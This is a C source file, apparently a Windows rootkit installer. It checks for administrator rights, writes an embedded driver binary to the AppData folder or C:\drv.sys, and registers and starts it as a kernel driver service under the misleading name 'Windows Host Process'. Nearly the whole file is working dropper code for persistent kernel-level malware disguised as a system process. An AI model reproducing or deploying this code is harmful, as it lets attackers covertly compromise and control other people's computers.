
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include "RootkitInstaller.h"
#include "RootkitDriver.inc"

#define DRIVER_NAME		"Windows Host Process"

void InstallDriver(char const *path, char const *name )
{
    SC_HANDLE hManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (hManager == NULL) return;
	
    SC_HANDLE hService = CreateService(hManager, 
        name,                       // driver name
        name,                       // driver display name
        SERVICE_ALL_ACCESS,            // allow ourselves to start the service.
        SERVICE_KERNEL_DRIVER,      // type of driver.
        SERVICE_DEMAND_START,       // starts after boot drivers.
        SERVICE_ERROR_NORMAL,       // log any problems, but don't crash if it can't be loaded.
        path,                       // path to binary file.
        NULL,                     // group to which this driver belongs.
        NULL,                       
        NULL,                   // driver we depend upon.
        NULL,                       // run from the default LocalSystem account.
        NULL);                      // don't need a password for LocalSystem .

	CloseServiceHandle(hManager);
	
	// The driver is now installed in the machine.  We'll try to start it dynamically.
	if (hService == NULL) return;
	
	
    StartService(hService, 0, NULL); // no arguments - drivers get their "stuff" from the registry.

        // We're done with the service handle
    CloseServiceHandle(hService);    // and with the service manager.
}

#define MAX_FILEPATH 1024

bool ContainsSpaces(char *Path)
{
	int i;
	for (i = 0; i < strlen(Path); i++)
	{
		if (Path[i] == ' ') return true;
	}
	return false;
}

BOOL IsUserElevatedAdmin()
{
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID SecurityIdentifier;
    if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &SecurityIdentifier))
        return 0;

    BOOL IsAdminMember;
    if (!CheckTokenMembership(NULL, SecurityIdentifier, &IsAdminMember))
        IsAdminMember = FALSE;

    FreeSid(SecurityIdentifier);

    return IsAdminMember;
}

void UninstallDriver(char *driverName)
{
    SERVICE_STATUS Status;
    
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL)
    {
		#ifdef DEBUG
        printf("Error Opening Service Manager (%d)\n", GetLastError());
		#endif
		
		return;
    }
    
    SC_HANDLE SHandle = OpenService(hSCManager, driverName, SC_MANAGER_ALL_ACCESS);
    if (SHandle == NULL)
    {
		#ifdef DEBUG
        printf("Error Opening Service (%d)\n", GetLastError());
		#endif
		
		CloseServiceHandle(hSCManager); 
		return;
    }
    
    if (!ControlService(SHandle, SERVICE_CONTROL_STOP, &Status))
    {
		#ifdef DEBUG
        printf("Failed to Send Service Stop Command (%d)\n ", GetLastError());
		#endif
    }
    else
    {
		#ifdef DEBUG
		printf("Service Stop Command Sent\n");
		#endif
	}
	
	DeleteService(SHandle);
	CloseServiceHandle(SHandle);    // We're done with the service handle
    CloseServiceHandle(hSCManager); 
}

void InitiateRootkit()
{
	if (IsUserElevatedAdmin() == false) return;	
	UninstallDriver(DRIVER_NAME);
	char DriverPath[MAX_FILEPATH];
	sprintf(DriverPath, "%s\\drv.sys", getenv("appdata"));
	if (ContainsSpaces(DriverPath)) sprintf(DriverPath, "C:\\drv.sys");
	FILE *Driver = fopen(DriverPath, "wb");
	if (Driver == NULL) return;
	fwrite(rDriver, sizeof(char), sizeof(rDriver), Driver);
	fclose(Driver);

	InstallDriver(DriverPath, DRIVER_NAME);
	
}